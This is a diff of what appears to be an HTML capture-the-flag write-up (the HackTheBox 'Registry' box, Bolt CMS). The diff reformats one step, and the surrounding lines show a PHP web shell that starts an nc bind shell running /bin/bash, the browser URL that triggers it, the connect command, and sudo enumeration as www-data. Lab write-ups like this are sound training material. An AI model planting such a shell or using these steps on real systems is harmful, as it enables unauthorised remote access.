@@ -488,8 +488,9 @@ Poking around on the <a href="https://docs.bolt.cm/3.7/manual/login" target="_bl
 &lt;?php
 system('/dev/shm/nc -e /bin/bash -lvnp 9001');
 ?&gt;
-</code></pre><p><strong>4)</strong> Run the script via a browser to start the listener on the box (e.g. http://10.10.10.159/bolt/files/exploit.php)</p>
-<p><strong>5)</strong> Connect from local machine, e.g;</p>
+</code></pre><p><strong>4)</strong> Run the script via a browser to start the listener on the box, e.g:</p>
+<pre><code>http://10.10.10.159/bolt/files/exploit.php
+</code></pre><p><strong>5)</strong> Connect from local machine, e.g;</p>
 <p><code>skynet Registry/bolt » nc 10.10.10.159 9001</code></p>
 <p>We now have a shell as the www-data user. I opted to quickly run another LinEnum scan with this user but, whilst that ran, I also decided to try some of the basics that didn&rsquo;t work using our bolt user, namely our ability to run <code>sudo -l</code> to list commands we can run, via that user, with sudo:</p>
 <pre><code>www-data@bolt:~$ sudo -l
